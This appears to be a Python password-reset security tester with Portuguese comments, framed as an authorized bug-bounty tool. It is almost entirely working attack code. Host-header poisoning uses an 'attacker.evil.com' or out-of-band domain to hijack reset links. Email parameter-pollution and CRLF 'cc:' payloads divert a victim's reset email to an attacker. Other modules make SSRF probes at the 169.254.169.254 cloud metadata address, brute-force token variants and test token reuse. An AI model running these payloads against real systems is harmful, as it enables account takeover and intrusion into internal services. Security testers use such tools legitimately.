#!/usr/bin/env python3
"""
reset_tester.py — Password Reset Security Tester
Foco: Account Takeover via Password Reset
OWASP Testing Guide — OTG-AUTHN-009
Uso autorizado em bug bounty / pentest com permissão explícita.

Uso:
  python3 reset_tester.py --url URL --data "email=you@you.com" --tests all
  python3 reset_tester.py --url URL --data "email=you@you.com" --oob abc123.oast.live --tests host,ssrf,pollution
  python3 reset_tester.py --url URL --data "email=you@you.com" --token-url URL_RESET --tests token,expiry
"""

import argparse
import sys
import time
import math
import hashlib
import threading
import random
import re
from datetime import datetime

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests não instalado. Execute: pip3 install requests")
    sys.exit(1)

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
B = "\033[94m"; C = "\033[96m"; W = "\033[0m"; BOLD = "\033[1m"

FINDINGS = []

def banner():
    print(f"""{C}
  ██████╗ ███████╗███████╗███████╗████████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝╚══██╔══╝
  ██████╔╝█████╗  ███████╗█████╗     ██║   
  ██╔══██╗██╔══╝  ╚════██║██╔══╝     ██║   
  ██║  ██║███████╗███████║███████╗   ██║   
  ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝   
  Password Reset Security Tester — Bug Bounty Edition
  OWASP OTG-AUTHN-009 | OOB Ready
{W}""")

def log_finding(title, detail, severity="MEDIUM"):
    colors = {"CRITICAL": R+BOLD, "HIGH": R, "MEDIUM": Y, "LOW": B, "INFO": C}
    c = colors.get(severity, W)
    print(f"\n{c}[{severity}] {title}{W}\n  {detail}")
    FINDINGS.append({"severity": severity, "title": title, "detail": detail})

def log_info(msg):  print(f"{B}[*]{W} {msg}")
def log_ok(msg):    print(f"{G}[+]{W} {msg}")
def log_fail(msg):  print(f"{R}[-]{W} {msg}")
def log_warn(msg):  print(f"{Y}[!]{W} {msg}")
def section(title): print(f"\n{BOLD}{'─'*50}{W}\n{BOLD}[TEST] {title}{W}\n{'─'*50}")

def parse_data(data_str):
    result = {}
    for pair in data_str.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            result[k.strip()] = v.strip()
    return result

def send_request(url, data, headers=None, method="POST", verify=False, timeout=10):
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
    }
    if headers:
        base_headers.update(headers)
    results = {}
    for ctype, send_as in [("form", "data"), ("json", "json")]:
        try:
            h = {**base_headers, "Content-Type":
                "application/x-www-form-urlencoded" if ctype == "form" else "application/json"}
            results[ctype] = requests.request(method, url,
                **{send_as: data}, headers=h, verify=verify, timeout=timeout, allow_redirects=False)
        except:
            results[ctype] = None
    return results

def best_response(results):
    for key in ["form", "json"]:
        r = results.get(key)
        if r and r.status_code < 500:
            return r, key
    for key in ["form", "json"]:
        r = results.get(key)
        if r:
            return r, key
    return None, None

# ─────────────────────────────────────────────
# TESTES
# ─────────────────────────────────────────────

def test_rate_limit(url, data, rounds=20):
    section("Rate Limit & User Enumeration")
    blocked_at = None

    for i in range(1, rounds + 1):
        r, ctype = best_response(send_request(url, data))
        if not r:
            log_fail(f"Request {i}: sem resposta"); continue
        body_lower = r.text.lower()
        is_blocked = r.status_code in [429, 403, 503] or any(
            k in body_lower for k in ["rate limit", "too many", "bloqueado", "blocked", "limite"])
        if is_blocked and not blocked_at:
            blocked_at = i
            log_ok(f"Request {i}: {r.status_code} — RATE LIMIT detectado!")
        else:
            icon = G if r.status_code == 200 else Y
            print(f"  {icon}[{i:02d}]{W} {r.status_code} | {len(r.text)}b | {ctype}")
        time.sleep(0.1)

    if not blocked_at:
        log_finding("Sem Rate Limit", f"{rounds} requests sem bloqueio — automação possível.", "HIGH")
    else:
        log_ok(f"Rate limit ativo após {blocked_at} requests.")

    # User enumeration
    log_info("Testando user enumeration...")
    email_key = next((k for k in data if "email" in k.lower()), None)
    if email_key:
        fake_data = {**data, email_key: f"naoexiste_{random.randint(1000,9999)}@fake99999.xyz"}
        r_valid, _ = best_response(send_request(url, data))
        r_fake,  _ = best_response(send_request(url, fake_data))
        if r_valid and r_fake:
            if r_valid.status_code != r_fake.status_code:
                log_finding("User Enumeration via Status Code",
                    f"Válido: {r_valid.status_code} | Inválido: {r_fake.status_code}", "MEDIUM")
            elif len(r_valid.text) != len(r_fake.text):
                log_finding("User Enumeration via Response Size",
                    f"Válido: {len(r_valid.text)}b | Inválido: {len(r_fake.text)}b", "MEDIUM")
            else:
                log_ok("Sem user enumeration detectado.")


def test_host_header(url, data, oob=None):
    section("Host Header Poisoning")
    # Com OOB: usa o interactsh para capturar o callback no email enviado
    # Sem OOB: usa domínio fixo e verificação manual no email
    attacker = oob if oob else "attacker.evil.com"

    payloads = [
        {"Host": attacker},
        {"Host": attacker, "X-Forwarded-Host": attacker},
        {"X-Forwarded-Host": attacker},
        {"X-Host": attacker},
        {"X-Forwarded-Server": attacker},
        {"X-HTTP-Host-Override": attacker},
        {"Forwarded": f"host={attacker}"},
        {"X-Original-Host": attacker},
        {"X-Rewrite-URL": attacker},
    ]

    if oob:
        log_info(f"OOB ativo: {C}{attacker}{W}")
        log_warn(f"Monitore o interactsh — callback HTTP com '/password-reset/' = HOST HEADER POISON confirmado!")
    else:
        log_warn(f"Sem OOB — verifique manualmente o link no email recebido")

    for i, headers in enumerate(payloads, 1):
        r, _ = best_response(send_request(url, data, headers=headers))
        if r:
            key = list(headers.keys())[0]
            print(f"  [{i}] {key}: {r.status_code} | {len(r.text)}b")
        time.sleep(0.3)

    if oob:
        log_finding("Host Header Poisoning",
            f"Payloads enviados com Host: {attacker}\n  "
            f"Verifique interactsh — callback com path /password-reset/ = CRITICAL (ATO)", "HIGH")
    else:
        log_finding("Host Header Poisoning — verificação manual",
            f"Enviado com Host: {attacker}. Verifique link no email.", "HIGH")


def test_parameter_pollution(url, data, oob=None):
    section("Parameter Pollution & Email Manipulation")
    email_key = next((k for k in data if "email" in k.lower()), None)
    if not email_key:
        log_warn("Campo 'email' não encontrado. Pulando."); return

    victim = data[email_key]

    # Com OOB: attacker email usa o domínio interactsh — qualquer entrega é capturada
    attacker = f"attacker@{oob}" if oob else f"attacker_{random.randint(1000,9999)}@attacker-oob.com"

    if oob:
        log_info(f"OOB ativo — attacker email: {C}{attacker}{W}")
        log_warn("Qualquer entrega de email para esse endereço aparece no interactsh!")
    else:
        log_warn(f"Sem OOB — attacker email: {attacker} (verificação manual necessária)")

    tests = [
        ("Duplicate param",      f"{email_key}={victim}&{email_key}={attacker}"),
        ("Carbon Copy CRLF",     {email_key: f"{victim}%0Acc:{attacker}"}),
        ("Carbon Copy newline",  {email_key: f"{victim}\ncc:{attacker}"}),
        ("Carbon Copy tab",      {email_key: f"{victim}\tcc:{attacker}"}),
        ("Null byte",            {email_key: f"{victim}%00{attacker}"}),
        ("Null byte @",          {email_key: f"{victim}%00@{attacker}"}),
        ("Case variation",       {email_key: victim.upper()}),
        ("Plus alias",           {email_key: victim.replace("@", f"+bounty{random.randint(100,999)}@")}),
        ("Space before",         {email_key: f" {victim}"}),
        ("Space after",          {email_key: f"{victim} "}),
        ("JSON array",           {email_key: [victim, attacker]}),
        ("Comma separated",      {email_key: f"{victim},{attacker}"}),
        ("Semicolon separated",  {email_key: f"{victim};{attacker}"}),
        ("Pipe separated",       {email_key: f"{victim}|{attacker}"}),
        ("Unicode @",            {email_key: victim.replace("@", "\uff20")}),
    ]

    for name, payload in tests:
        try:
            if isinstance(payload, str):
                r = requests.post(url, data=payload,
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Mozilla/5.0"},
                    verify=False, timeout=10, allow_redirects=False)
            else:
                r, _ = best_response(send_request(url, payload))
            if r:
                success = r.status_code == 200 and any(
                    k in r.text.lower() for k in ["success","sent","enviado","ok","true"])
                icon = G if success else Y
                print(f"  {icon}[{name}]{W} {r.status_code} | {len(r.text)}b {'← ACEITO!' if success else ''}")
        except Exception as e:
            print(f"  {R}[{name}]{W} Erro: {e}")
        time.sleep(0.2)

    oob_note = f"Monitore interactsh para callbacks em {attacker}" if oob else f"Verifique emails em {attacker}"
    log_warn(oob_note)


def test_ssrf(url, data, oob=None):
    section("SSRF via Password Reset")
    email_key = next((k for k in data if "email" in k.lower()), None)
    victim = data.get(email_key, "test@test.com") if email_key else "test@test.com"

    # 1. SSRF via redirect params na URL
    log_info("Testando SSRF via parâmetros de redirect...")
    # Com OOB: testa se servidor faz request para o interactsh via redirect param
    ssrf_targets = [f"http://{oob}/ssrf-redirect"] if oob else [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1/",
    ]
    redirect_params = ["redirect","next","return","returnUrl","return_url",
                       "callback","goto","url","link","continue"]

    for param in redirect_params:
        for target in ssrf_targets:
            test_url = f"{url}?{param}={target}"
            try:
                r = requests.post(test_url, data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Mozilla/5.0"},
                    verify=False, timeout=8, allow_redirects=False)
                loc = r.headers.get("Location","")
                if oob and (oob in loc or oob in r.text):
                    log_finding("SSRF via Redirect Parameter",
                        f"Param: {param} | Target: {target} | OOB callback esperado!", "HIGH")
                elif not oob and ("169.254" in r.text or r.status_code in [200,301,302]):
                    print(f"  [{param}] {r.status_code} | {len(r.text)}b ← inspecionar")
                else:
                    print(f"  [{param}] {r.status_code} | {len(r.text)}b")
            except: pass
        time.sleep(0.1)

    # 2. SSRF via Origin/Referer
    log_info("Testando SSRF via headers Origin/Referer/X-Forwarded-For...")
    internal_targets = [f"http://{oob}"] if oob else ["http://169.254.169.254","http://localhost"]
    header_tests = []
    for t in internal_targets:
        header_tests += [
            {"Origin": t},
            {"Referer": f"{t}/latest/meta-data/"},
            {"X-Forwarded-For": oob if oob else "169.254.169.254"},
            {"True-Client-IP": oob if oob else "169.254.169.254"},
            {"X-Real-IP": oob if oob else "169.254.169.254"},
        ]

    baseline, _ = best_response(send_request(url, data))
    for headers in header_tests:
        r, _ = best_response(send_request(url, data, headers=headers))
        if r:
            key = list(headers.keys())[0]
            diff = f" {Y}← DIFERENTE!{W}" if baseline and len(r.text) != len(baseline.text) else ""
            print(f"  [{key}] {r.status_code} | {len(r.text)}b{diff}")
        time.sleep(0.2)

    # 3. SSRF via campo email com subdomínio OOB
    if oob and email_key:
        log_info(f"Testando SSRF via campo email com OOB ({oob})...")
        oob_payloads = [
            {email_key: f"test@{oob}"},
            {email_key: f"test%40{victim}@{oob}"},
            {email_key: f"test+ssrf@{oob}"},
        ]
        for payload in oob_payloads:
            r, _ = best_response(send_request(url, payload))
            if r:
                val = list(payload.values())[0]
                print(f"  [email OOB: {val}] {r.status_code} | {len(r.text)}b")
            time.sleep(0.2)
        log_warn(f"Monitore interactsh — callback DNS/HTTP = SSRF via email confirmado!")
    elif not oob:
        log_info("Sem --oob — SSRF via email field requer interactsh para confirmar")

    log_finding("SSRF — análise OOB" + (" em andamento" if oob else " recomendada"),
        f"{'Monitore interactsh para callbacks.' if oob else 'Use --oob com interactsh para confirmar.'}", "INFO")


def test_verb_tampering(url, data):
    section("HTTP Verb Tampering")
    baseline, _ = best_response(send_request(url, data, method="POST"))
    if baseline:
        log_info(f"Baseline POST: {baseline.status_code} | {len(baseline.text)}b")
    for verb in ["GET","PUT","PATCH","DELETE","OPTIONS","HEAD","TRACE"]:
        r, ctype = best_response(send_request(url, data, method=verb))
        if r:
            diff = f"{Y}← mesmo comportamento!{W}" if baseline and r.status_code == baseline.status_code else ""
            print(f"  [{verb}] {r.status_code} | {len(r.text)}b {diff}")
        time.sleep(0.2)


def test_security_headers(url, data):
    section("Security Headers & Transport")
    try:
        base_url = url.rsplit("/", 1)[0]
        r = requests.get(base_url, verify=False, timeout=10)
        h = r.headers
        cookie = h.get("Set-Cookie","")
        checks = {
            "Strict-Transport-Security": h.get("Strict-Transport-Security"),
            "Content-Security-Policy":   h.get("Content-Security-Policy"),
            "X-Frame-Options":           h.get("X-Frame-Options"),
            "X-Content-Type-Options":    h.get("X-Content-Type-Options"),
            "Referrer-Policy":           h.get("Referrer-Policy"),
            "Permissions-Policy":        h.get("Permissions-Policy"),
            "Cookie Secure flag":        "Secure" in cookie or None,
            "Cookie HttpOnly flag":      "HttpOnly" in cookie or None,
            "Cookie SameSite":           "SameSite" in cookie or None,
        }
        for header, value in checks.items():
            if value:
                print(f"  {G}[✓]{W} {header}: {value if isinstance(value, str) else 'presente'}")
            else:
                print(f"  {R}[✗]{W} {header}: ausente")
                if header in ["Strict-Transport-Security","Cookie Secure flag"]:
                    log_finding(f"Header ausente: {header}",
                        f"{header} não configurado.", "MEDIUM")
    except Exception as e:
        log_fail(f"Erro: {e}")


def test_token_analysis(url, data, token_url=None):
    section("Token Analysis — Entropy, Reuse, IDOR, Pattern")

    log_info("Cole tokens coletados para análise (Enter em branco para finalizar):")
    tokens = []
    while True:
        t = input("  Token: ").strip()
        if not t: break
        tokens.append(t)

    if not tokens:
        log_warn("Nenhum token fornecido."); return

    _analyze_token_patterns(tokens)

    if token_url and tokens:
        # Reuse test
        log_info("Testando reuse do primeiro token...")
        test_url = token_url.replace("TOKEN", tokens[0]) if "TOKEN" in token_url else token_url
        try:
            r1 = requests.get(test_url, verify=False, timeout=10, allow_redirects=False)
            time.sleep(2)
            r2 = requests.get(test_url, verify=False, timeout=10, allow_redirects=False)
            if r1.status_code == r2.status_code == 200:
                log_finding("Token Reuse", "Token válido em múltiplas requests.", "HIGH")
            else:
                log_ok(f"Token invalidado após uso: 1ª={r1.status_code} 2ª={r2.status_code}")
        except Exception as e:
            log_fail(f"Erro reuse: {e}")

        # IDOR
        log_info("Testando IDOR — variações do token...")
        base = tokens[0]
        variants = [
            base[:-1] + ("a" if base[-1] != "a" else "b"),
            base[::-1],
            "0" * len(base),
            "f" * len(base),
        ]
        for v in variants:
            tu = token_url.replace("TOKEN", v) if "TOKEN" in token_url else token_url
            try:
                r = requests.get(tu, verify=False, timeout=8, allow_redirects=False)
                icon = R if r.status_code == 200 else G
                print(f"  {icon}[{v[:16]}...]{W} {r.status_code}")
                if r.status_code == 200:
                    log_finding("IDOR no Token", f"Variação aceita: {v[:20]}...", "HIGH")
            except: pass
            time.sleep(0.3)


def _analyze_token_patterns(tokens):
    log_info(f"Analisando {len(tokens)} tokens...")
    for i, t in enumerate(tokens):
        fmt = "unknown"
        if re.match(r'^[0-9a-f]{32}$', t):   fmt = "MD5"
        elif re.match(r'^[0-9a-f]{40}$', t): fmt = "SHA-1"
        elif re.match(r'^[0-9a-f]{64}$', t): fmt = "SHA-256"
        elif re.match(r'^[0-9a-zA-Z_-]{20,}\.[^.]+\.[^.]+$', t): fmt = "JWT"
        elif re.match(r'^[0-9a-f-]{36}$', t): fmt = "UUID"

        charset = sum([
            10 if any(c.isdigit() for c in t) else 0,
            26 if any(c.islower() for c in t) else 0,
            26 if any(c.isupper() for c in t) else 0,
        ])
        entropy = len(t) * math.log2(charset) if charset else 0
        print(f"  [{i+1}] {t[:24]}... | fmt={fmt} | len={len(t)} | entropy≈{entropy:.0f}bits")

    if len(tokens) >= 2:
        same_prefix = 0
        for pos in range(min(len(t) for t in tokens)):
            if len(set(t[pos] for t in tokens)) == 1:
                same_prefix += 1
            else: break
        if same_prefix > 3:
            log_finding("Prefixo fixo nos tokens",
                f"Primeiros {same_prefix} chars iguais — entropia reduzida!", "HIGH")
        else:
            log_ok("Sem prefixo fixo — boa aleatoriedade aparente.")


def test_token_expiry(token_url):
    section("Token Expiry por Tempo — OWASP recomenda máx. 1h")
    if not token_url or "TOKEN" in token_url:
        log_warn("Forneça URL completa com token real: --token-url https://.../reset/abc123")
        return

    log_info(f"Token: ...{token_url[-20:]}")
    r0 = requests.get(token_url, verify=False, timeout=10, allow_redirects=False)
    log_info(f"Status inicial: {r0.status_code}")

    intervals = [(1,"1 min"),(5,"5 min"),(30,"30 min"),(60,"1 hora")]
    elapsed = 0
    for wait_mins, label in intervals:
        secs = (wait_mins - elapsed) * 60
        if secs <= 0: continue
        try:
            log_info(f"Aguardando {label}... (Ctrl+C para pular)")
            time.sleep(secs)
            elapsed = wait_mins
        except KeyboardInterrupt:
            log_warn(f"Pulando {label}"); continue
        r = requests.get(token_url, verify=False, timeout=10, allow_redirects=False)
        icon = R if r.status_code == 200 else G
        print(f"  {icon}[{label}]{W} {r.status_code} | {len(r.text)}b")
        if r.status_code == 200:
            log_finding(f"Token válido após {label}",
                "OWASP recomenda expiração máxima de 1 hora.",
                "HIGH" if wait_mins > 60 else "MEDIUM")


def test_concurrent_tokens(url, data, threads=5):
    section("Concurrent Token Generation")
    log_info(f"Enviando {threads} requests simultâneas...")
    responses = []; lock = threading.Lock()

    def worker():
        r, ctype = best_response(send_request(url, data))
        if r:
            with lock: responses.append((r.status_code, len(r.text), ctype))

    ts = [threading.Thread(target=worker) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()

    for i, (status, size, ctype) in enumerate(responses):
        print(f"  [Thread {i+1}] {status} | {size}b | {ctype}")
    if len(responses) == threads:
        log_finding("Concurrent Reset aceitas",
            f"{threads} requests simultâneas — múltiplos tokens válidos possíveis.", "MEDIUM")


def print_summary():
    print(f"\n{BOLD}{'═'*50}{W}")
    print(f"{BOLD}  RESUMO DOS FINDINGS — {datetime.now().strftime('%H:%M:%S')}{W}")
    print(f"{'═'*50}")
    colors = {"CRITICAL": R+BOLD, "HIGH": R, "MEDIUM": Y, "LOW": B, "INFO": C}
    for sev in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
        for f in [x for x in FINDINGS if x["severity"] == sev]:
            print(f"  {colors[sev]}[{sev}]{W} {f['title']}")
    print(f"\n  Total: {len(FINDINGS)} finding(s)")
    print(f"{BOLD}{'═'*50}{W}\n")


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
def main():
    banner()
    parser = argparse.ArgumentParser(description="Password Reset Security Tester")
    parser.add_argument("--url",         required=True)
    parser.add_argument("--data",        required=True, help="'email=a@b.com' ou 'email=a@b.com&user=x'")
    parser.add_argument("--token-url",   help="URL completa de reset com token real")
    parser.add_argument("--oob",         help="Domínio interactsh (ex: abc123.oast.live)")
    parser.add_argument("--tests",       default="all",
        help="all, rate, host, pollution, ssrf, verb, headers, token, expiry, concurrent")
    parser.add_argument("--rate-rounds", type=int, default=20)
    parser.add_argument("--threads",     type=int, default=5)
    args = parser.parse_args()

    data = parse_data(args.data)
    selected = [t.strip().lower() for t in args.tests.split(",")]
    run_all = "all" in selected

    print(f"{B}[*]{W} URL:    {args.url}")
    print(f"{B}[*]{W} Data:   {data}")
    print(f"{B}[*]{W} Testes: {args.tests}")
    if args.oob:
        print(f"{G}[*]{W} OOB:    {C}{args.oob}{W} ← interactsh ativo")
    print(f"{B}[*]{W} Início: {datetime.now().strftime('%H:%M:%S')}")

    if run_all or "rate"       in selected: test_rate_limit(args.url, data, args.rate_rounds)
    if run_all or "host"       in selected: test_host_header(args.url, data, args.oob)
    if run_all or "pollution"  in selected: test_parameter_pollution(args.url, data, args.oob)
    if run_all or "ssrf"       in selected: test_ssrf(args.url, data, args.oob)
    if run_all or "verb"       in selected: test_verb_tampering(args.url, data)
    if run_all or "headers"    in selected: test_security_headers(args.url, data)
    if run_all or "concurrent" in selected: test_concurrent_tokens(args.url, data, args.threads)
    if run_all or "token"      in selected: test_token_analysis(args.url, data, args.token_url)
    if "expiry"                in selected: test_token_expiry(args.token_url)

    print_summary()

if __name__ == "__main__":
    main()
